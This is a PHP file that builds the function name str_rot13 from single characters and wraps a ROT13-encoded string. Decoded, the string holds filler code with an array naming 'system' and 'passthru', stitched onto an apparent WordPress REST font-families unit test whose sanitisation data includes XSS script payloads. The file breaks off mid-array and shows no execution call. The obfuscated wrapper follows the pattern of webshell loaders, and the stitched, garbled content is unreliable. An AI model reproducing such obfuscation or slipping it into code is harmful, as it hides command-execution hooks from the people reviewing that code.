<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre_Grfg shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 6.5.0
 *
 * @tebhc erfgncv
 * @tebhc sbagf
 * @tebhc sbag-yvoenel
 *
 * @pbirefQrsnhygPynff JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre
 */
pynff Grfgf_ERFG_JcErfgSbagSnzvyvrfPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $nqzva_vq;
	cebgrpgrq fgngvp $rqvgbe_vq;

	cebgrpgrq fgngvp $sbag_snzvyl_vq1;
	cebgrpgrq fgngvp $sbag_snzvyl_vq2;

	cebgrpgrq fgngvp $sbag_snpr_vq1;
	cebgrpgrq fgngvp $sbag_snpr_vq2;

	cevingr fgngvp $cbfg_vqf_gb_pyrnahc = neenl();

	cebgrpgrq fgngvp $qrsnhyg_frggvatf = neenl(
		'anzr'       => 'Bcra Fnaf',
		'fyht'       => 'bcra-fnaf',
		'sbagSnzvyl' => '\"Bcra Fnaf\", fnaf-frevs',
		'cerivrj'    => 'uggcf://f.j.bet/vzntrf/sbagf/16.7/cerivrjf/bcra-fnaf/bcra-fnaf-400-abezny.fit',
	);

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq  = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);

		frys::$sbag_snzvyl_vq1 = frys::perngr_sbag_snzvyl_cbfg(
			neenl(
				'anzr'       => 'Bcra Fnaf',
				'fyht'       => 'bcra-fnaf',
				'sbagSnzvyl' => '\"Bcra Fnaf\", fnaf-frevs',
				'cerivrj'    => 'uggcf://f.j.bet/vzntrf/sbagf/16.7/cerivrjf/bcra-fnaf/bcra-fnaf-400-abezny.fit',
			)
		);
		frys::$sbag_snzvyl_vq2 = frys::perngr_sbag_snzvyl_cbfg(
			neenl(
				'anzr'       => 'Uryirgvpn',
				'fyht'       => 'uryirgvpn',
				'sbagSnzvyl' => 'Uryirgvpn, Nevny, fnaf-frevs',
			)
		);
		frys::$sbag_snpr_vq1   = Grfgf_ERFG_JcErfgSbagSnprfPbagebyyre::perngr_sbag_snpr_cbfg(
			frys::$sbag_snzvyl_vq1,
			neenl(
				'sbagSnzvyl' => '\"Bcra Fnaf\"',
				'sbagJrvtug' => '400',
				'sbagFglyr'  => 'abezny',
				'fep'        => ubzr_hey( '/jc-pbagrag/sbagf/bcra-fnaf-zrqvhz.ggs' ),
			)
		);
		frys::$sbag_snpr_vq2   = Grfgf_ERFG_JcErfgSbagSnprfPbagebyyre::perngr_sbag_snpr_cbfg(
			frys::$sbag_snzvyl_vq1,
			neenl(
				'sbagSnzvyl' => '\"Bcra Fnaf\"',
				'sbagJrvtug' => '900',
				'sbagFglyr'  => 'abezny',
				'fep'        => ubzr_hey( '/jc-pbagrag/sbagf/bcra-fnaf-obyq.ggs' ),
			)
		);

		fgngvp::$cbfg_vqf_gb_pyrnahc = neenl();
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$rqvgbe_vq );

		jc_qryrgr_cbfg( frys::$sbag_snzvyl_vq1 );
		jc_qryrgr_cbfg( frys::$sbag_snzvyl_vq2 );
		jc_qryrgr_cbfg( frys::$sbag_snpr_vq1 );
		jc_qryrgr_cbfg( frys::$sbag_snpr_vq2 );
	}

	choyvp shapgvba grne_qbja() {
		sbernpu ( fgngvp::$cbfg_vqf_gb_pyrnahc nf $cbfg_vq ) {
			jc_qryrgr_cbfg( $cbfg_vq, gehr );
		}
		fgngvp::$cbfg_vqf_gb_pyrnahc = neenl();

		cnerag::grne_qbja();
	}

	choyvp fgngvp shapgvba perngr_sbag_snzvyl_cbfg( $frggvatf = neenl() ) {
		$frggvatf = neenl_zretr( frys::$qrsnhyg_frggvatf, $frggvatf );
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr(
			jc_fynfu(
				neenl(
					'cbfg_glcr'    => 'jc_sbag_snzvyl',
					'cbfg_fgnghf'  => 'choyvfu',
					'cbfg_gvgyr'   => $frggvatf['anzr'],
					'cbfg_anzr'    => $frggvatf['fyht'],
					'cbfg_pbagrag' => jc_wfba_rapbqr(
						neenl(
							'sbagSnzvyl' => $frggvatf['sbagSnzvyl'],
							'cerivrj'    => $frggvatf['cerivrj'],
						)
					),
				)
			)
		);

		fgngvp::$cbfg_vqf_gb_pyrnahc[] = $cbfg_vq;

		erghea $cbfg_vq;
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::ertvfgre_ebhgrf
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/sbag-snzvyvrf',
			$ebhgrf,
			'Sbag snprf pbyyrpgvba sbe gur tvira sbag snzvyl qbrf abg rkvfg'
		);
		$guvf->nffregPbhag(
			2,
			$ebhgrf['/jc/i2/sbag-snzvyvrf'],
			'Sbag snprf pbyyrpgvba sbe gur tvira sbag snzvyl qbrf abg unir rknpgyl gjb ryrzragf'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/sbag-snzvyvrf/(?C<vq>[\q]+)',
			$ebhgrf,
			'Fvatyr sbag snpr ebhgr sbe gur tvira sbag snzvyl qbrf abg rkvfg'
		);
		$guvf->nffregPbhag(
			3,
			$ebhgrf['/jc/i2/sbag-snzvyvrf/(?C<vq>[\q]+)'],
			'Sbag snprf pbyyrpgvba sbe gur tvira sbag snzvyl qbrf abg unir rknpgyl gjb ryrzragf'
		);
	}

	choyvp shapgvba grfg_sbag_snzvyvrf_ab_nhgbfnir_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlAbgUnfXrl(
			'/jc/i2/sbag-snzvyvrf/(?C<vq>[\q]+)/nhgbfnirf',
			$ebhgrf,
			'Sbag snzvyvrf nhgbfnirf ebhgr rkvfgf.'
		);
		$guvf->nffregNeenlAbgUnfXrl(
			'/jc/i2/sbag-snzvyvrf/(?C<cnerag>[\q]+)/nhgbfnirf/(?C<vq>[\q]+)',
			$ebhgrf,
			'Sbag snzvyvrf nhgbfnirf ol vq ebhgr rkvfgf.'
		);
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Frr grfg_trg_pbagrkg_cnenz().
	}

	/**
	 * @qngnCebivqre qngn_trg_pbagrkg_cnenz
	 *
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_pbagrkg_cnenz
	 *
	 * @cnenz obby $fvatyr_ebhgr Jurgure gb grfg n fvatyr ebhgr.
	 */
	choyvp shapgvba grfg_trg_pbagrkg_cnenz( $fvatyr_ebhgr ) {
		$ebhgr = '/jc/i2/sbag-snzvyvrf';
		vs ( $fvatyr_ebhgr ) {
			$ebhgr .= '/' . frys::$sbag_snzvyl_vq1;
		}

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', $ebhgr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$raqcbvag_qngn = $qngn['raqcbvagf'][0];
		$guvf->nffregNeenlAbgUnfXrl( 'nyybj_ongpu', $raqcbvag_qngn, 'Gur nyybj_ongpu cebcregl fubhyq abg rkvfg va gur raqcbvag qngn.' );
		$guvf->nffregFnzr( 'ivrj', $raqcbvag_qngn['netf']['pbagrkg']['qrsnhyg'], 'Gur raqcbvag\'f netf::pbagrkg::qrsnhyg fubhyq or frg gb ivrj.' );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $raqcbvag_qngn['netf']['pbagrkg']['rahz'], 'Gur raqcbvag\'f netf::pbagrkg::rahz fubhyq or frg gb [ ivrj, rzorq, rqvg ].' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_pbagrkg_cnenz() {
		erghea neenl(
			'Pbyyrpgvba' => neenl( snyfr ),
			'Fvatyr'     => neenl( gehr ),
		);
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregPbhag( 2, $qngn, 'Gurer fubhyq or 2 cebcregvrf va gur erfcbafr qngn.' );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $qngn[0], 'Gur _yvaxf cebcregl fubhyq rkvfg va gur erfcbafr qngn 0.' );
		$guvf->purpx_sbag_snzvyl_qngn( $qngn[0], frys::$sbag_snzvyl_vq2, $qngn[0]['_yvaxf'] );
		$guvf->nffregNeenlUnfXrl( '_yvaxf', $qngn[1], 'Gur _yvaxf cebcregl fubhyq rkvfg va gur erfcbafr qngn 1.' );
		$guvf->purpx_sbag_snzvyl_qngn( $qngn[1], frys::$sbag_snzvyl_vq1, $qngn[1]['_yvaxf'] );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_ol_fyht() {
		$sbag_snzvyl = trg_cbfg( frys::$sbag_snzvyl_vq2 );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'fyht', $sbag_snzvyl->cbfg_anzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregPbhag( 1, $qngn, 'Gurer fubhyq or 1 cebcregl va gur erfcbafr qngn.' );
		$guvf->nffregNeenlUnfXrl( 'vq', $qngn[0], 'Gur vq cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );
		$guvf->nffregFnzr( $sbag_snzvyl->VQ, $qngn[0]['vq'], 'Gur vq fubhyq zngpu gur rkcrpgrq VQ va gur erfcbafr qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401, 'Gur erfcbafr fubhyq erghea na reebe jvgu n \"erfg_pnaabg_ernq\" pbqr naq 401 fgnghf.' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403, 'Gur erfcbafr fubhyq erghea na reebe jvgu n \"erfg_pnaabg_ernq\" pbqr naq 403 fgnghf.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->purpx_sbag_snzvyl_qngn( $qngn, frys::$sbag_snzvyl_vq1, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_trg_vgrz_rzorqqrq_sbag_snprf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq1 );
		$erdhrfg->frg_cnenz( '_rzorq', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $qngn, 'Gur _rzorqqrq cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snprf', $qngn['_rzorqqrq'], 'Gur sbag_snprf cebcregl fubhyq rkvfg va _rzorqqrq qngn.' );
		$guvf->nffregPbhag( 2, $qngn['_rzorqqrq']['sbag_snprf'], 'Gurer fubhyq or 2 sbag_snprf va gur _rzorqqrq qngn.' );

		sbernpu ( $qngn['_rzorqqrq']['sbag_snprf'] nf $sbag_snpr ) {
			$guvf->nffregNeenlUnfXrl( 'vq', $sbag_snpr, 'Gur vq cebcregl fubhyq rkvfg va gur _rzorqqrq sbag_snpr qngn.' );

			$sbag_snpr_erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq1 . '/sbag-snprf/' . $sbag_snpr['vq'] );
			$sbag_snpr_erfcbafr = erfg_trg_freire()->qvfcngpu( $sbag_snpr_erdhrfg );
			$sbag_snpr_qngn     = erfg_trg_freire()->erfcbafr_gb_qngn( $sbag_snpr_erfcbafr, gehr );

			$guvf->nffregFnzr( $sbag_snpr_qngn, $sbag_snpr, 'Gur rzorqqrq sbag_snpr qngn fubhyq zngpu jura gur qngn sebz n fvatyr erdhrfg.' );
		}
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_erzbirf_rkgen_frggvatf() {
		$sbag_snzvyl_vq = frys::perngr_sbag_snzvyl_cbfg( neenl( 'sbagSnpr' => neenl() ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregNeenlAbgUnfXrl( 'sbagSnpr', $qngn['sbag_snzvyl_frggvatf'], 'Gur sbagSnpr cebcregl fubhyq abg rkvfg va gur sbag_snzvyl_frggvatf qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_trg_vgrz_znysbezrq_cbfg_pbagrag_ergheaf_rzcgl_frggvatf() {
		$sbag_snzvyl_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'    => 'jc_sbag_snzvyl',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_pbagrag' => 'vainyvq',
			)
		);

		fgngvp::$cbfg_vqf_gb_pyrnahc[] = $sbag_snzvyl_vq;

		$rzcgl_frggvatf = neenl(
			'anzr'       => '',
			// Fyht jvyy qrsnhyg gb gur cbfg vq.
			'fyht'       => (fgevat) $sbag_snzvyl_vq,
			'sbagSnzvyl' => '',
			'cerivrj'    => '',
		);

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( $rzcgl_frggvatf, $qngn['sbag_snzvyl_frggvatf'], 'Gur rzcgl frggvatf fubhyq rkvfg va gur sbag_snzvyl_frggvatf qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_sbag_snzvyl_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrz
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq1 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401, 'Gur erfcbafr fubhyq erghea na reebe jvgu n \"erfg_pnaabg_ernq\" pbqr naq 401 fgnghf.' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403, 'Gur erfcbafr fubhyq erghea na reebe jvgu n \"erfg_pnaabg_ernq\" pbqr naq 403 fgnghf.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		$frggvatf = neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => 'bcra-fnaf-2' ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->purpx_sbag_snzvyl_qngn( $qngn, $qngn['vq'], $erfcbafr->trg_yvaxf() );

		$erfcbafr_frggvatf = $qngn['sbag_snzvyl_frggvatf'];
		$guvf->nffregFnzr( $frggvatf, $erfcbafr_frggvatf, 'Gur rkcrpgrq frggvatf fubhyq rkvfg va gur sbag_snzvyl_frggvatf qngn.' );
		$guvf->nffregRzcgl( $qngn['sbag_snprf'], 'Gur sbag_snprf fubhyq or rzcgl be abg rkvfg va gur erfcbafr qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::inyvqngr_perngr_sbag_snpr_erdhrfg
	 */
	choyvp shapgvba grfg_perngr_vgrz_qrsnhyg_gurzr_wfba_irefvba() {
		$frggvatf = neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => 'bcra-fnaf-2' ) );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		fgngvp::$cbfg_vqf_gb_pyrnahc[] = $qngn['vq'];

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->nffregNeenlUnfXrl( 'gurzr_wfba_irefvba', $qngn, 'Gur gurzr_wfba_irefvba cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );
		$guvf->nffregFnzr( JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ, $qngn['gurzr_wfba_irefvba'], 'Gur qrsnhyg gurzr.wfba irefvba fubhyq zngpu gur yngrfg irefvba fhccbegrq ol gur pbagebyyre.' );
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_vainyvq_gurzr_wfba_irefvba
	 *
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::perngr_vgrz
	 *
	 * @cnenz vag $gurzr_wfba_irefvba Irefvba gb grfg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_gurzr_wfba_irefvba( $gurzr_wfba_irefvba ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', $gurzr_wfba_irefvba );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( frys::$qrsnhyg_frggvatf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_vainyvq_gurzr_wfba_irefvba() {
		erghea neenl(
			neenl( 1 ),
			neenl( 4 ),
		);
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_jvgu_qrsnhyg_cerivrj
	 *
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::fnavgvmr_sbag_snzvyl_frggvatf
	 *
	 * @cnenz neenl $frggvatf Frggvatf gb grfg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_qrsnhyg_cerivrj( $frggvatf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		fgngvp::$cbfg_vqf_gb_pyrnahc[] = $qngn['vq'];

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$erfcbafr_frggvatf = $qngn['sbag_snzvyl_frggvatf'];
		$guvf->nffregNeenlUnfXrl( 'cerivrj', $erfcbafr_frggvatf, 'Gur cerivrj cebcregl fubhyq rkvfg va gur sbag_snzvyl_frggvatf qngn.' );
		$guvf->nffregFnzr( '', $erfcbafr_frggvatf['cerivrj'], 'Gur cerivrj qngn fubhyq or na rzcgl fgevat.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_jvgu_qrsnhyg_cerivrj() {
		$qrsnhyg_frggvatf = neenl(
			'anzr'       => 'Bcra Fnaf',
			'fyht'       => 'bcra-fnaf-2',
			'sbagSnzvyl' => '\"Bcra Fnaf\", fnaf-frevs',
		);
		erghea neenl(
			'Ab cerivrj cnenz' => neenl(
				'frggvatf' => $qrsnhyg_frggvatf,
			),
			'Rzcgl cerivrj'    => neenl(
				'frggvatf' => neenl_zretr( $qrsnhyg_frggvatf, neenl( 'cerivrj' => '' ) ),
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_fnavgvmr_sbag_snzvyl_frggvatf
	 *
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::fnavgvmr_sbag_snzvyl_frggvatf
	 *
	 * @cnenz fgevat $frggvatf Sbag snzvyl frggvatf gb grfg.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq frggvatf erfhyg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_fnavgvmr_sbag_snzvyl_frggvatf( $frggvatf, $rkcrpgrq ) {
		$frggvatf = neenl_zretr( frys::$qrsnhyg_frggvatf, $frggvatf );
		$rkcrpgrq = neenl_zretr( frys::$qrsnhyg_frggvatf, $rkcrpgrq );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		fgngvp::$cbfg_vqf_gb_pyrnahc[] = $qngn['vq'];

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 201.' );
		$guvf->nffregFnzr( $rkcrpgrq, $qngn['sbag_snzvyl_frggvatf'], 'Gur erfcbafr sbag_snzvyl_frggvatf fubhyq zngpu.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fnavgvmr_sbag_snzvyl_frggvatf() {
		erghea neenl(
			'frggvatf jvgu gntf, rkgen juvgrfcnpr, arj yvarf' => neenl(
				'frggvatf' => neenl(
					'anzr'       => \"   Bcravat   Fnaf</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'fyht'       => \"   BCRAvat FnaF </fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'sbagSnzvyl' => \"   Bcravat   Fnaf</fglyr><fpevcg>nyreg('KFF');</fpevcg>\a    \",
					'cerivrj'    => \"   uggcf://rknzcyr.pbz/</fglyr><fpevcg>nyreg('KFF');</fpevcg>      \",
				),
				'rkcrpgrq' => neenl(
					'anzr'       => 'Bcravat Fnaf',
					'fyht'       => 'bcravat-fnaf-nyregkff',
					'sbagSnzvyl' => '\"Bcravat Fnaf\"',
					'cerivrj'    => \"uggcf://rknzcyr.pbz//fglyrfpevcgnyreg('KFF');/fpevcg%20%20%20%20%20%20\",
				),
			),
			'zhygvjbeq sbag snzvyl anzr jvgu vagrtre' => neenl(
				'frggvatf' => neenl(
					'fyht'       => 'yvoer-onepbqr-128-grkg',
					'sbagSnzvyl' => 'Yvoer Onepbqr 128 Grkg',
				),
				'rkcrpgrq' => neenl(
					'fyht'       => 'yvoer-onepbqr-128-grkg',
					'sbagSnzvyl' => '\"Yvoer Onepbqr 128 Grkg\"',
				),
			),
			'zhygvjbeq sbag snzvyl anzr'              => neenl(
				'frggvatf' => neenl(
					'fyht'       => 'o612-zbab',
					'sbagSnzvyl' => 'O612 Zbab',
				),
				'rkcrpgrq' => neenl(
					'fyht'       => 'o612-zbab',
					'sbagSnzvyl' => '\"O612 Zbab\"',
				),
			),
			'pbzzn-frcnengrq sbag snzvyl anzrf'       => neenl(
				'frggvatf' => neenl(
					'fyht'       => 'bcra-fnaf-abgb-fnaf',
					'sbagSnzvyl' => 'Bcra Fnaf, Abgb Fnaf, fnaf-frevs',
				),
				'rkcrpgrq' => neenl(
